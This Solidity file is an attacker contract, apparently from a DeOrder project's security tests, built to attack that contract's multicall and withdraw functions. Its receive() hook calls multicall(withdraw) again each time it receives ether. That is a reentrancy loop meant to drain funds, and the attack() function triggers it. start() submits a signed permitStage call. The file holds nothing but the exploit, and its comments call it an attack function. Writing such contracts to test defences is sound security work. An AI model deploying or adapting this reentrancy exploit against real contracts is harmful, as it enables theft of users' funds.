import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";
import {DeOrderVerifier} from "contracts/DeOrderVerifier.sol";
import "contracts/interface/IOrder.sol";

contract AttackMulticallWithdraw {
    DeOrder public deOrder;
    WETH public weth;
    DeOrderVerifier public verifier;

    // 初始化Bank合约地址
    constructor(DeOrder _deOrder, WETH _weth, DeOrderVerifier _verifier) {
        deOrder = _deOrder;
        weth = _weth;
        verifier = _verifier;
    }

    function start(
        uint256[] memory _amounts,
        uint256[] memory _periods,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        deOrder.permitStage(
            2,
            _amounts,
            _periods,
            PaymentType.Due,
            0,
            20000,
            v,
            r,
            s
        );
    }

    // receive() external payable {}

    receive() external payable {
        if (weth.totalSupply() >= 1 ether) {
            bytes[] memory data = new bytes[](1);
            data[0] = abi.encodeWithSelector(
                deOrder.withdraw.selector,
                2,
                address(this)
            );
            deOrder.multicall(data);
        }
    }

    // 攻击函数
    function attack() external payable {
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSelector(
            deOrder.withdraw.selector,
            2,
            address(this)
        );
        deOrder.multicall(data);
    }
}
